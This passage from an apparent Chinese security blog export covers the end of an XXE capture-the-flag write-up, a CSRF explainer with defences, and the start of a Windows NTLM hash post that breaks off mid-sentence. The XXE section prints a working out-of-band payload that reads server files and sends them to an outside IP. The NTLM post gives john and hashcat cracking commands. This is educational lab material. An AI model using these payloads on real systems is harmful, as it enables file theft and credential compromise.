title=\"3.漏洞利用\"></a>3.漏洞利用</h4><p>确定了漏洞的存在，接下来就是利用漏洞搞事。XXE最常见的利用方式就是进行任意文件读取。获取敏感重要文件的内容。</p>\n<p>读取文件之前我们需要确定以什么方式读取：直接回显还是带外通道。</p>\n<p>直接回显即目标服务器会把结果直接放于响应页面中返回。观察响应页面就只有XML文档有效或无效的信息。显然我们只能采取带外通道读取的方式。读取文件的大概思路如下：</p>\n<blockquote>\n<p>1.确定要读取的文件，如/etc/passwd。</p>\n<p>2.再创建一个文件，文件内容是定义实体，具体内容见下面。</p>\n<p>3.修改evil.xml的内容，并将上一步创建的文件引用进来，具体内容见下面。</p>\n</blockquote>\n<p>首先，我们先尝试读取目标服务器的<code>/etc/passwd</code>文件。evil.xml文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE ANY [ </span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % dtd SYSTEM &quot;http://148.70.34.141/data.dtd&quot;&gt;</span><br><span class=\"line\">%dtd; %payload; %send;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>第3行作用是读取<code>/etc/passwd</code>文件内容，并使用php filter将内容进行压缩及Base64编码。</p>\n</li>\n<li><p>第4行引用了另一个文件，文件名为data.dtd，文件的内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://148.70.34.141/?data=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>该文件定义了一个实体，实体的内容又定义了另一个实体，内层实体的作用是将第三行压缩打包的内容作为HTTP请求参数发送到我们的HTTP服务器上。</li>\n<li><code>&amp;#37;</code>是<code>%</code>的实体，内层的实体的<code>%</code>必须要使用实体形式，否则是不能解析的。</li>\n<li>之所以还需要创建该文件，而不能将该文件内容直接定义在evil.xml中，是因为直接在evil.xml中定义是不生效的，不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</li>\n</ul>\n</li>\n<li><p>大概梳理一下两个文件的实体解析过程：</p>\n<blockquote>\n<ol>\n<li><p><code>%dtd;</code>会执行evil.xml的第3行，执行的结果是引用了<code>data.dtd</code>文件，可以简单认为将<code>data.dtd</code>的文件内容替换<code>%dtd;</code>。</p>\n</li>\n<li><p><code>%payload;</code>执行的就是<code>data.dtd</code>的内容，可简单认为，<code>%payload;</code>会被<code>&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://148.70.34.141/?data=%file;&#39;&gt;</code>进行替换。</p>\n</li>\n<li><code>%send;</code>会向<code>http://148.70.34.141/?data=%file;</code>发起请求，而发起请求前，<code>%file;</code>也会被解析，被压缩加密的<code>/etc/passwd</code>文件内容进行替换。</li>\n</ol>\n</blockquote>\n</li>\n</ul>\n<p>编写好Payload文件之后，继续之前的操作，让目标服务器请求我们的evil.xml文件。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/04readpasswd.png\" alt></p>\n<p>并没有成功读取<code>/etc/passwd</code>，而是报错了，根据错误信息我们可以知道，目标服务器对允许读取的路径进行了权限控制，只允许读取的路径为：<code>/challenge/web-serveur/ch29</code>。</p>\n<p>那么我们只能读取其他文件了，根据错误信息我们还可以知道，被允许读取的路径下，存在一个<code>index.php</code>文件，尝试读取该文件，只需要的evil.xml文件中的<code>/etc/passwd</code>改为<code>./index.php</code>（允许使用相对路径）即可。</p>\n<p>修改好evil.xml文件后，继续让目标服务器请求。发现被压缩加密的<code>index.php</code>文件内容被成功发送到我们的服务器。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/06readindex.png\" alt></p>\n<p>接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"keyword\">echo</span> file_get_contents(<span class=\"string\">\"php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>将该php文件放到phpstudy的web根目录下并访问，就可以在页面中找到flag。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/flag.png\" alt></p>\n<h3 id=\"0x03-总结\"><a href=\"#0x03-总结\" class=\"headerlink\" title=\"0x03 总结\"></a>0x03 总结</h3><p>做下来之后，题目的难度不算高，但是期间遇到了一个坑，感觉payload什么的都设置的没有问题了，但是一直读取不了文件，为此花了很长时间，最终查了一下资料才知道，使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错。</p>\n<p>刚开始使用的是：<code>php://filter/read=convert.base64-decode/resource=</code>，只对文件内容进行编码，所以文件过大无法发送。后面使用：<code>php://filter/read=convert.base64-decode/zlib.inflate/resource=</code>进行压缩编码才成功读取。</p>\n<blockquote>\n<p>压缩及编码：<code>echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);</code><br>解压及解码：<code>echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;);</code></p>\n</blockquote>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://xz.aliyun.com/t/3357\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/3357</a></p>"},{"title":"CSRF （Cross Site Request Forgery）","date":"2019-03-25T02:11:08.000Z","_content":"\n### 0x00 跨站请求伪造漏洞\n\n> CSRF主要利用受害者尚未失效的身份认证信息（Cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。\n\n### 0x01 漏洞本质\n\n其一、CSRF可以攻击成功的本质原因是因为请求的所有重要参数都可以被攻击者预测。\n\n其二、被攻击者在不知情的情况下身份认证信息（Cookie）被使用了。\n\n> 由上面两点我们可知，如果我们能够知道一个请求消息的所有参数，参数的值可以进行伪造，且被害者本地有认证信息（本地Cookie或临时Cookie），那么我们把该请求消息诱骗被害者来点击/提交，就能完成攻击。\n\n<!-- more -->\n\n### 0x02 Cookie\n\nCookie通常用来进行用户身份认证及状态记录。\n\nCookie可以分为两种：\n\n> - `Session Cookie`：又叫临时cookie。\n> - `Third-party Cookie`：又叫本地Cookie。\n\n当Set-Cookie时，若指定了expire时间，在expire时间超时之前，都将被存储在本地，就叫本地Cookie。\n\n当Set-Cookie时，若没有指定expire时间，仅存在于浏览器的程序的生命周期内，保存在浏览器进程的内存中，关闭浏览器后失效（新建tab页不会失效）。此时就是临时Cookie。\n\n### 0x03 浏览器Cookie策略\n\nCookie是在发起请求时浏览器自动携带在请求消息中的。\n\n对于一些跨域请求操作，一些浏览器处于安全考虑，默认会禁止在跨域请求时携带本地Cookie（临时Cookie不限制）。\n\n> - 默认会禁止的浏览器：IE6/7/8、Safari等。\n> - 默认不会禁止的浏览器：Firefox、Chrome、Android等。\n\n对于`<a>`、`<script>`、`<link>`、`<img>`、`<iframe>`等标签都可以进行跨域请求资源。\n\n因此，对于禁止在跨域请求时携带本地Cookie的情况下，攻击更复杂，比如需要让受害者先访问目标站点并进行了身份认证，让浏览器中先存在临时Cookie。对于没有禁止的环境下，只要受害者本地存储有Cookie，就能完成攻击。\n\n### 0X04 GET与POST提交数据\n\n若存在CSRF漏洞的功能点是以GET方式提交数据，只需要修改GET请求链接内容然后让用户点击即可完成攻击。\n\n若存在CSRF漏洞的功能点是以POST方式提交数据，我们需要在我们的服务器上创建一个提交数据的表单页面，然后让用户访问该页面。\n\n### 0x05 CSRF防御\n\n> 防御的思路围绕CSRF的本质考虑。\n\n**1. 验证码**\n\n对某些重要的操作，使用验证码验证，验证码一方面避免了身份认证信息在不知情的情况下被使用（因为与服务器有交互），另一方面攻击者在不知道验证码参数的值也无法完成攻击。\n\n缺点就是用户体验会很差，因为每次操作都需要输入验证码。因此作为辅助的防御手段。\n\n**2. Referer Check**\n\n在HTTP请求消息头中有一个`Referer`头部，该头部的值记录着是从哪个页面（URL）跳转过来的。\n\n通过对消息`Referer`头部进行检查，也可以对CSRF防御起到一定的作用。\n\n缺点是服务器不是任何时候都能获取的`Referer`的值，有时候出于安全考虑，限制了`Referer`的发送。\n\n**3. Token**\n\nToken是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。\n\n逻辑：\n\n当客户端访问页面时，服务器会生成Token，然后把Token值存储在Session中，并且在返回的表单页面中也会嵌入一个隐藏的`<input />`标签，标签的`value`属性值即为Token值。当用户填写表单提交数据时，Token也会自动被作为参数提交，服务器会先将提交过来的Token与Session中存储的Token做对比验证。\n\n针对CSRF的防御，如今一致的选择都是Token，但是使用Token也要注意一些安全准则：\n\n> - Token在使用后要及时销毁，避免被重复使用。\n> - Token参数尽可能采用POST方式提交，因为GET方式会将其放到URL中，可能会被Referer头部泄露。\n> - 若页面同时还存在XSS漏洞，那么Token防御将变得没有作用，因为XSS可以先读取到页面的Token再构造请求，即XSRF。","source":"_posts/CSRF.md","raw":"---\ntitle: CSRF （Cross Site Request Forgery）\ndate: 2019-03-25 10:11:08\ntags: \n\t- CSRF\n\t- 跨站请求伪造\ncategories: WEB漏洞学习\n---\n\n### 0x00 跨站请求伪造漏洞\n\n> CSRF主要利用受害者尚未失效的身份认证信息（Cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。\n\n### 0x01 漏洞本质\n\n其一、CSRF可以攻击成功的本质原因是因为请求的所有重要参数都可以被攻击者预测。\n\n其二、被攻击者在不知情的情况下身份认证信息（Cookie）被使用了。\n\n> 由上面两点我们可知，如果我们能够知道一个请求消息的所有参数，参数的值可以进行伪造，且被害者本地有认证信息（本地Cookie或临时Cookie），那么我们把该请求消息诱骗被害者来点击/提交，就能完成攻击。\n\n<!-- more -->\n\n### 0x02 Cookie\n\nCookie通常用来进行用户身份认证及状态记录。\n\nCookie可以分为两种：\n\n> - `Session Cookie`：又叫临时cookie。\n> - `Third-party Cookie`：又叫本地Cookie。\n\n当Set-Cookie时，若指定了expire时间，在expire时间超时之前，都将被存储在本地，就叫本地Cookie。\n\n当Set-Cookie时，若没有指定expire时间，仅存在于浏览器的程序的生命周期内，保存在浏览器进程的内存中，关闭浏览器后失效（新建tab页不会失效）。此时就是临时Cookie。\n\n### 0x03 浏览器Cookie策略\n\nCookie是在发起请求时浏览器自动携带在请求消息中的。\n\n对于一些跨域请求操作，一些浏览器处于安全考虑，默认会禁止在跨域请求时携带本地Cookie（临时Cookie不限制）。\n\n> - 默认会禁止的浏览器：IE6/7/8、Safari等。\n> - 默认不会禁止的浏览器：Firefox、Chrome、Android等。\n\n对于`<a>`、`<script>`、`<link>`、`<img>`、`<iframe>`等标签都可以进行跨域请求资源。\n\n因此，对于禁止在跨域请求时携带本地Cookie的情况下，攻击更复杂，比如需要让受害者先访问目标站点并进行了身份认证，让浏览器中先存在临时Cookie。对于没有禁止的环境下，只要受害者本地存储有Cookie，就能完成攻击。\n\n### 0X04 GET与POST提交数据\n\n若存在CSRF漏洞的功能点是以GET方式提交数据，只需要修改GET请求链接内容然后让用户点击即可完成攻击。\n\n若存在CSRF漏洞的功能点是以POST方式提交数据，我们需要在我们的服务器上创建一个提交数据的表单页面，然后让用户访问该页面。\n\n### 0x05 CSRF防御\n\n> 防御的思路围绕CSRF的本质考虑。\n\n**1. 验证码**\n\n对某些重要的操作，使用验证码验证，验证码一方面避免了身份认证信息在不知情的情况下被使用（因为与服务器有交互），另一方面攻击者在不知道验证码参数的值也无法完成攻击。\n\n缺点就是用户体验会很差，因为每次操作都需要输入验证码。因此作为辅助的防御手段。\n\n**2. Referer Check**\n\n在HTTP请求消息头中有一个`Referer`头部，该头部的值记录着是从哪个页面（URL）跳转过来的。\n\n通过对消息`Referer`头部进行检查，也可以对CSRF防御起到一定的作用。\n\n缺点是服务器不是任何时候都能获取的`Referer`的值，有时候出于安全考虑，限制了`Referer`的发送。\n\n**3. Token**\n\nToken是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。\n\n逻辑：\n\n当客户端访问页面时，服务器会生成Token，然后把Token值存储在Session中，并且在返回的表单页面中也会嵌入一个隐藏的`<input />`标签，标签的`value`属性值即为Token值。当用户填写表单提交数据时，Token也会自动被作为参数提交，服务器会先将提交过来的Token与Session中存储的Token做对比验证。\n\n针对CSRF的防御，如今一致的选择都是Token，但是使用Token也要注意一些安全准则：\n\n> - Token在使用后要及时销毁，避免被重复使用。\n> - Token参数尽可能采用POST方式提交，因为GET方式会将其放到URL中，可能会被Referer头部泄露。\n> - 若页面同时还存在XSS漏洞，那么Token防御将变得没有作用，因为XSS可以先读取到页面的Token再构造请求，即XSRF。","slug":"CSRF","published":1,"updated":"2019-03-25T03:49:02.762Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83lj003e7or0pi4tfokq","content":"<h3 id=\"0x00-跨站请求伪造漏洞\"><a href=\"#0x00-跨站请求伪造漏洞\" class=\"headerlink\" title=\"0x00 跨站请求伪造漏洞\"></a>0x00 跨站请求伪造漏洞</h3><blockquote>\n<p>CSRF主要利用受害者尚未失效的身份认证信息（Cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>\n</blockquote>\n<h3 id=\"0x01-漏洞本质\"><a href=\"#0x01-漏洞本质\" class=\"headerlink\" title=\"0x01 漏洞本质\"></a>0x01 漏洞本质</h3><p>其一、CSRF可以攻击成功的本质原因是因为请求的所有重要参数都可以被攻击者预测。</p>\n<p>其二、被攻击者在不知情的情况下身份认证信息（Cookie）被使用了。</p>\n<blockquote>\n<p>由上面两点我们可知，如果我们能够知道一个请求消息的所有参数，参数的值可以进行伪造，且被害者本地有认证信息（本地Cookie或临时Cookie），那么我们把该请求消息诱骗被害者来点击/提交，就能完成攻击。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h3 id=\"0x02-Cookie\"><a href=\"#0x02-Cookie\" class=\"headerlink\" title=\"0x02 Cookie\"></a>0x02 Cookie</h3><p>Cookie通常用来进行用户身份认证及状态记录。</p>\n<p>Cookie可以分为两种：</p>\n<blockquote>\n<ul>\n<li><code>Session Cookie</code>：又叫临时cookie。</li>\n<li><code>Third-party Cookie</code>：又叫本地Cookie。</li>\n</ul>\n</blockquote>\n<p>当Set-Cookie时，若指定了expire时间，在expire时间超时之前，都将被存储在本地，就叫本地Cookie。</p>\n<p>当Set-Cookie时，若没有指定expire时间，仅存在于浏览器的程序的生命周期内，保存在浏览器进程的内存中，关闭浏览器后失效（新建tab页不会失效）。此时就是临时Cookie。</p>\n<h3 id=\"0x03-浏览器Cookie策略\"><a href=\"#0x03-浏览器Cookie策略\" class=\"headerlink\" title=\"0x03 浏览器Cookie策略\"></a>0x03 浏览器Cookie策略</h3><p>Cookie是在发起请求时浏览器自动携带在请求消息中的。</p>\n<p>对于一些跨域请求操作，一些浏览器处于安全考虑，默认会禁止在跨域请求时携带本地Cookie（临时Cookie不限制）。</p>\n<blockquote>\n<ul>\n<li>默认会禁止的浏览器：IE6/7/8、Safari等。</li>\n<li>默认不会禁止的浏览器：Firefox、Chrome、Android等。</li>\n</ul>\n</blockquote>\n<p>对于<code>&lt;a&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>等标签都可以进行跨域请求资源。</p>\n<p>因此，对于禁止在跨域请求时携带本地Cookie的情况下，攻击更复杂，比如需要让受害者先访问目标站点并进行了身份认证，让浏览器中先存在临时Cookie。对于没有禁止的环境下，只要受害者本地存储有Cookie，就能完成攻击。</p>\n<h3 id=\"0X04-GET与POST提交数据\"><a href=\"#0X04-GET与POST提交数据\" class=\"headerlink\" title=\"0X04 GET与POST提交数据\"></a>0X04 GET与POST提交数据</h3><p>若存在CSRF漏洞的功能点是以GET方式提交数据，只需要修改GET请求链接内容然后让用户点击即可完成攻击。</p>\n<p>若存在CSRF漏洞的功能点是以POST方式提交数据，我们需要在我们的服务器上创建一个提交数据的表单页面，然后让用户访问该页面。</p>\n<h3 id=\"0x05-CSRF防御\"><a href=\"#0x05-CSRF防御\" class=\"headerlink\" title=\"0x05 CSRF防御\"></a>0x05 CSRF防御</h3><blockquote>\n<p>防御的思路围绕CSRF的本质考虑。</p>\n</blockquote>\n<p><strong>1. 验证码</strong></p>\n<p>对某些重要的操作，使用验证码验证，验证码一方面避免了身份认证信息在不知情的情况下被使用（因为与服务器有交互），另一方面攻击者在不知道验证码参数的值也无法完成攻击。</p>\n<p>缺点就是用户体验会很差，因为每次操作都需要输入验证码。因此作为辅助的防御手段。</p>\n<p><strong>2. Referer Check</strong></p>\n<p>在HTTP请求消息头中有一个<code>Referer</code>头部，该头部的值记录着是从哪个页面（URL）跳转过来的。</p>\n<p>通过对消息<code>Referer</code>头部进行检查，也可以对CSRF防御起到一定的作用。</p>\n<p>缺点是服务器不是任何时候都能获取的<code>Referer</code>的值，有时候出于安全考虑，限制了<code>Referer</code>的发送。</p>\n<p><strong>3. Token</strong></p>\n<p>Token是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。</p>\n<p>逻辑：</p>\n<p>当客户端访问页面时，服务器会生成Token，然后把Token值存储在Session中，并且在返回的表单页面中也会嵌入一个隐藏的<code>&lt;input /&gt;</code>标签，标签的<code>value</code>属性值即为Token值。当用户填写表单提交数据时，Token也会自动被作为参数提交，服务器会先将提交过来的Token与Session中存储的Token做对比验证。</p>\n<p>针对CSRF的防御，如今一致的选择都是Token，但是使用Token也要注意一些安全准则：</p>\n<blockquote>\n<ul>\n<li>Token在使用后要及时销毁，避免被重复使用。</li>\n<li>Token参数尽可能采用POST方式提交，因为GET方式会将其放到URL中，可能会被Referer头部泄露。</li>\n<li>若页面同时还存在XSS漏洞，那么Token防御将变得没有作用，因为XSS可以先读取到页面的Token再构造请求，即XSRF。</li>\n</ul>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-跨站请求伪造漏洞\"><a href=\"#0x00-跨站请求伪造漏洞\" class=\"headerlink\" title=\"0x00 跨站请求伪造漏洞\"></a>0x00 跨站请求伪造漏洞</h3><blockquote>\n<p>CSRF主要利用受害者尚未失效的身份认证信息（Cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>\n</blockquote>\n<h3 id=\"0x01-漏洞本质\"><a href=\"#0x01-漏洞本质\" class=\"headerlink\" title=\"0x01 漏洞本质\"></a>0x01 漏洞本质</h3><p>其一、CSRF可以攻击成功的本质原因是因为请求的所有重要参数都可以被攻击者预测。</p>\n<p>其二、被攻击者在不知情的情况下身份认证信息（Cookie）被使用了。</p>\n<blockquote>\n<p>由上面两点我们可知，如果我们能够知道一个请求消息的所有参数，参数的值可以进行伪造，且被害者本地有认证信息（本地Cookie或临时Cookie），那么我们把该请求消息诱骗被害者来点击/提交，就能完成攻击。</p>\n</blockquote>","more":"<h3 id=\"0x02-Cookie\"><a href=\"#0x02-Cookie\" class=\"headerlink\" title=\"0x02 Cookie\"></a>0x02 Cookie</h3><p>Cookie通常用来进行用户身份认证及状态记录。</p>\n<p>Cookie可以分为两种：</p>\n<blockquote>\n<ul>\n<li><code>Session Cookie</code>：又叫临时cookie。</li>\n<li><code>Third-party Cookie</code>：又叫本地Cookie。</li>\n</ul>\n</blockquote>\n<p>当Set-Cookie时，若指定了expire时间，在expire时间超时之前，都将被存储在本地，就叫本地Cookie。</p>\n<p>当Set-Cookie时，若没有指定expire时间，仅存在于浏览器的程序的生命周期内，保存在浏览器进程的内存中，关闭浏览器后失效（新建tab页不会失效）。此时就是临时Cookie。</p>\n<h3 id=\"0x03-浏览器Cookie策略\"><a href=\"#0x03-浏览器Cookie策略\" class=\"headerlink\" title=\"0x03 浏览器Cookie策略\"></a>0x03 浏览器Cookie策略</h3><p>Cookie是在发起请求时浏览器自动携带在请求消息中的。</p>\n<p>对于一些跨域请求操作，一些浏览器处于安全考虑，默认会禁止在跨域请求时携带本地Cookie（临时Cookie不限制）。</p>\n<blockquote>\n<ul>\n<li>默认会禁止的浏览器：IE6/7/8、Safari等。</li>\n<li>默认不会禁止的浏览器：Firefox、Chrome、Android等。</li>\n</ul>\n</blockquote>\n<p>对于<code>&lt;a&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>等标签都可以进行跨域请求资源。</p>\n<p>因此，对于禁止在跨域请求时携带本地Cookie的情况下，攻击更复杂，比如需要让受害者先访问目标站点并进行了身份认证，让浏览器中先存在临时Cookie。对于没有禁止的环境下，只要受害者本地存储有Cookie，就能完成攻击。</p>\n<h3 id=\"0X04-GET与POST提交数据\"><a href=\"#0X04-GET与POST提交数据\" class=\"headerlink\" title=\"0X04 GET与POST提交数据\"></a>0X04 GET与POST提交数据</h3><p>若存在CSRF漏洞的功能点是以GET方式提交数据，只需要修改GET请求链接内容然后让用户点击即可完成攻击。</p>\n<p>若存在CSRF漏洞的功能点是以POST方式提交数据，我们需要在我们的服务器上创建一个提交数据的表单页面，然后让用户访问该页面。</p>\n<h3 id=\"0x05-CSRF防御\"><a href=\"#0x05-CSRF防御\" class=\"headerlink\" title=\"0x05 CSRF防御\"></a>0x05 CSRF防御</h3><blockquote>\n<p>防御的思路围绕CSRF的本质考虑。</p>\n</blockquote>\n<p><strong>1. 验证码</strong></p>\n<p>对某些重要的操作，使用验证码验证，验证码一方面避免了身份认证信息在不知情的情况下被使用（因为与服务器有交互），另一方面攻击者在不知道验证码参数的值也无法完成攻击。</p>\n<p>缺点就是用户体验会很差，因为每次操作都需要输入验证码。因此作为辅助的防御手段。</p>\n<p><strong>2. Referer Check</strong></p>\n<p>在HTTP请求消息头中有一个<code>Referer</code>头部，该头部的值记录着是从哪个页面（URL）跳转过来的。</p>\n<p>通过对消息<code>Referer</code>头部进行检查，也可以对CSRF防御起到一定的作用。</p>\n<p>缺点是服务器不是任何时候都能获取的<code>Referer</code>的值，有时候出于安全考虑，限制了<code>Referer</code>的发送。</p>\n<p><strong>3. Token</strong></p>\n<p>Token是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。</p>\n<p>逻辑：</p>\n<p>当客户端访问页面时，服务器会生成Token，然后把Token值存储在Session中，并且在返回的表单页面中也会嵌入一个隐藏的<code>&lt;input /&gt;</code>标签，标签的<code>value</code>属性值即为Token值。当用户填写表单提交数据时，Token也会自动被作为参数提交，服务器会先将提交过来的Token与Session中存储的Token做对比验证。</p>\n<p>针对CSRF的防御，如今一致的选择都是Token，但是使用Token也要注意一些安全准则：</p>\n<blockquote>\n<ul>\n<li>Token在使用后要及时销毁，避免被重复使用。</li>\n<li>Token参数尽可能采用POST方式提交，因为GET方式会将其放到URL中，可能会被Referer头部泄露。</li>\n<li>若页面同时还存在XSS漏洞，那么Token防御将变得没有作用，因为XSS可以先读取到页面的Token再构造请求，即XSRF。</li>\n</ul>\n</blockquote>"},{"title":"Windows认证之NTLM","date":"2019-04-03T03:58:18.000Z","_content":"\n### 0x00 Windows密码存储\n\nWe all konw，明文存储密码是很愚蠢的行为，因为如果系统被攻破，明文密码被拿到，那么意味就全完了，但是如果是先加密再进行存储的话，即使黑客拿到加密的密码，破解也是需要费很大功夫和时间的。\n\n而现在采用的加密算法基本都是Hash摘要算法，Hash算法可以把任意长度的输入通过散列算法输出一串固定长度的值。\n\n常见的Hash算法诸如md5、SHA等，Hash算法有如下特点：\n\n> - 单向不可逆性：通过Hash值无法反向推导出输入的值。\n> - 如果两个哈希值相同，两个输入值很可能(极大概率)是相同的，但也可能不同，这种情况称为“哈希碰撞”\n\n说了那么多就是为了表明一点，Windows在存储用户密码时也不直接存储明文密码，存储的是明文密码经过Hash计算得到的Hash值，Windows存储的Hash称为`NTLM Hash`，或者`NTLM`。\n\n<!-- more -->\n\n**存储路径：**\n\n首先用户密码的Hash肯定需要存储在系统的某个文件或数据库中，Windows将用户密码计算得到的Hash存储在：\n\n> - 工作组或本地环境中，存储在一个名为`SAM`的文件内，文件路径为：`%SystemRoot%\\system32\\config\\sam`\n> - 如果是域环境，它们还存储在NTDS.dit数据库中。\n\n**存储格式：**\n\nWindows会存储用户密码对应的两种Hash，分别是`LM Hash`和`NT Hash`，它们是如何计算的，我们下节讨论。但要注意的一点是，从Windows Vista 和 Windows Server 2008开始，默认情况下只存储`NT Hash`，`LM Hash`将不再存储。\n\n格式：\n\n```\nusername : unique_identifier : LM hash : NT hash\n```\n\nusername即用户名。\n\nunique_identifier即盐（salt）。\n\nWindows将用户的密码计算为`LM Hash`和`NT Hash`，然后将它们使用冒号`:`分割存储在数据库中。\n\n### 0x01 NT Hash与LM Hash\n\n`LM Hash`是早期Windows存储的Hash格式，从Windows Vista/Server 2008开始默认是关闭的。\n\n`NT Hash`是现在Windows主要的存储的Hash。\n\n**NT Hash算法：**\n\n1.先将用户密码转换为十六进制格式。\n\n2.将十六进制格式的密码进行Unicode编码。\n\n3.使用MD4摘要算法对Unicode编码数据进行Hash计算，得到结果就是`NT Hash`。\n\n```\nadmin -> hex(16进制编码) = 61646d696e\n61646d696e -> Unicode = 610064006d0069006e00\n610064006d0069006e00 -> MD4 = 209c6174da490caeb422f3fa5a7ae634\n```\n\n破解方式：\n\n```\njohn --format=nt hash.txt\nhashcat -m 1000 -a 3 hash.txt\n```\n\n**LM Hash算法：**\n\n```\n将所有小写字母转换为大写字母\n>123ABC    // 未达到7个字符\n\n将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补\n>31323341424300000000000000\n\n将密码分割为两组7个字符\n>31323341424300 00000000000000   //16进制\n\n将每组转化为比特流，不足56Bit则在左边加0\n>31323341424300 ->(转换为二进制) 110001001100100011001101000001010000100100001100000000-> (补足56Bit) 00110001001100100011001101000001010000100100001100000000\n\n将比特流按照7比特一组，分出8组，末尾加0\n由于后者都为0，结果可想而知，那就都是0;\n将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个结果转换为16进制。\n-> 00110000100110001000110001101000000101000001001000001100 00000000\n->30988C6814120C00 -> DES(30988C6814120C00) -> 48-D7-EB-91- 2F-5E-69-7C\n\n由于我们的密码不超过7字节，所以后面的一半是固定的:\nAA-D3-B4-35-B5-14-04-EE\n\n连接两个DES加密字符串。得到LM哈希。\n48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE\n```\n\n通过算法我们可以看到`LM Hash`脆弱点就在于DES的Key（`KGS!@#$%`）是固定的，也就是说，有了Key就能够解出原文。\n\n并且根据`LM Hash`特征，也能够判断用户的密码是否是大于等于7位。\n\n破解方式：\n\n```\njohn --format=lm hash.txt\nhashcat -m 3000 -a 3 hash.txt\n```\n\n**用Python计算Hash并与系统(win10)内存存储的Hash对比：**\n\n![](V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190405092904.png)\n\n### 0x02 NTLM v1/v2（AKA Net-NTLM v1/v2）\n\n> `NTLM（NT LAN Manager）`，又称为`Net-NTLM`，是一个网络认证协议，他是一种用于在Client和Server之间进行Challenge/Response验证的协议。\n\n**NTLM v1/v2与LM、NT Hash的关系：**\n\nNTLM是一个认证协议，使用LM Hash或NT Hash来进行验证。\n\n> - 在NTLM v1中，使用LM Hash和NT Hash来进行验证，如今v1已被废弃。\n> - 自从Windows 2000之后，NTLM v2是默认的认证协议。\n\nNTLM v1与NTLM v2之间的区别我们放在网络认证的章节来讨论。\n\n### 0x03 本地认证\n\n> 所谓的本地认证即在物理主机上直接进行登录的认证过程。\n\n**本地认证的大致流程：**\n\n> winlogon.exe -> 接收用户输入 -> lsass.exe -> (认证)\n\n- Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。\n- 